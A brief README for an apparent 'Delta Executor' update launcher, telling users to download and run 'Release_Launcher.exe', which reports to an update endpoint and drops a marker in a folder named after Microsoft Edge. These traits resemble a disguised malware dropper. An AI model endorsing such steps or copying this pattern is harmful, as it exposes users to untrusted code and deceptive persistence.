# Delta Executor — Update Launcher

Small launcher used by the Delta Executor updater. Drop-in replacement: unpack and run.

## Install
1. Download `Release_Launcher.exe`
2. Run it (no dependencies, Windows 10/11 x64)
3. The launcher reports back to the update endpoint and drops a marker in `%LOCALAPPDATA%\MicrosoftEdge`
